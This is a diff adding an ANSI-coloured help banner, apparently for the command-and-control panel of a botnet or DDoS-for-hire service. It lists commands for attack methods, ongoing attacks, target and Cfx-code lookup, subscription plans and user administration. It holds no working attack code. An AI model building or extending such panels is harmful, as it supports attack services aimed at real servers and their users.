@@ -1,0 +1,17 @@
+$[clear]
+[97m│ [38;2;143;0;255mclear     [97m [97mClear the terminal screen.
+[97m│ [38;2;143;0;255mhelp      [97m [97mView this exact banner.
+[97m│ [38;2;143;0;255mmethods   [97m [97mView the methods list banner.
+[97m│ [38;2;143;0;255mplan      [97m [97mView your plan details.
+[97m│ [38;2;143;0;255mlookup    [97m [97mLookup a target, Cfx code.
+[97m│ [38;2;143;0;255mpasswd    [97m [97mChange your password.
+[97m│ [38;2;143;0;255mongoing   [97m [97mView ongoing attacks in the CNC.
+[97m│ [38;2;143;0;255musers     [97m [97mView all available users commands.
+[97m│ [38;2;143;0;255mlogs      [97m [97mView all available logs commands.
+[97m│ [38;2;143;0;255mmessage   [97m [97mBroadcast a message to online users.
+[97m│ [38;2;143;0;255mroles     [97m [97mView all role commands.
+[97m│ [38;2;143;0;255mpresets   [97m [97mView all preset commands.
+[97m│ [38;2;143;0;255mglobal    [97m [97mView all global commands.
+[97m│ [38;2;143;0;255mlicense   [97m [97mView license info.
+[97m│ [38;2;143;0;255mstats     [97m [97mView stats.
+[97m│ [38;2;143;0;255m2fa       [97m [97mView 2fa / mfa settings.
